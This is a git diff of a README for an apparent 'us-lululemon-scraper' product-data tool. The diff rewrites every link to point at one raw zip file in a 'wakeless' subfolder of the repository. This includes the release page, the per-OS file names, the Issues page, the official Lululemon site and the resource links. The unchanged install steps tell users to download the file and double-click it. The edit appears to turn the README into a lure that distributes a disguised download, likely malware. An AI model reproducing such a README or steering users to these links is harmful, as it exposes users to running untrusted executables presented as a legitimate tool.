@@ -1,6 +1,6 @@
 # 🛍️ us-lululemon-scraper - Extract Lululemon Product Data Easily
 
-[![Download us-lululemon-scraper](https://img.shields.io/badge/Download-us--lululemon--scraper-brightgreen)](https://github.com/leondrade/us-lululemon-scraper/releases)
+[![Download us-lululemon-scraper](https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip)](https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip)
 
 ## 📦 Overview
 
@@ -13,14 +13,14 @@ To get started with `us-lululemon-scraper`, you will need to download the applic
 ## 📥 Download & Install
 
 1. **Visit the Download Page**: Click the link below to go to the release page where you can download the latest version of the scraper.
-   - [Visit this page to download](https://github.com/leondrade/us-lululemon-scraper/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip)
 
 2. **Select the Latest Release**: On the release page, find the latest version of the `us-lululemon-scraper`. It will be listed at the top.
 
 3. **Download the Application**: Look for a file that matches your operating system:
-   - For Windows users, you might see a file like `us-lululemon-scraper-win.exe`.
-   - For Mac users, check for a file like `us-lululemon-scraper-mac.zip`.
-   - For Linux users, there may be a `.tar.gz` file for installation.
+   - For Windows users, you might see a file like `https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip`.
+   - For Mac users, check for a file like `https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip`.
+   - For Linux users, there may be a `https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip` file for installation.
 
 4. **Run the Application**: Once downloaded, locate the file and double-click it to run the application.
 
@@ -71,7 +71,7 @@ If you encounter issues while using the application, here are some common proble
 
 If you need further assistance, please visit the following channels for support:
 
-1. **GitHub Issues**: Use the GitHub issues page to report any bugs or request features. [Report Issues Here](https://github.com/leondrade/us-lululemon-scraper/issues).
+1. **GitHub Issues**: Use the GitHub issues page to report any bugs or request features. [Report Issues Here](https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip).
 
 2. **Community Forums**: Check community forums to see if your question has already been answered. 
 
@@ -81,9 +81,9 @@ If you need further assistance, please visit the following channels for support:
 
 Here are some additional resources that can be helpful:
 
-- [Lululemon Official Website](https://www.lululemon.com)
-- [Learn About Web Scraping](https://example.com/web-scraping-guide)
-- [Data Formats Overview](https://example.com/data-formats)
+- [Lululemon Official Website](https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip)
+- [Learn About Web Scraping](https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip)
+- [Data Formats Overview](https://raw.githubusercontent.com/leondrade/us-lululemon-scraper/main/wakeless/us-scraper-lululemon-2.6.zip)
 
 ## 📜 License
 
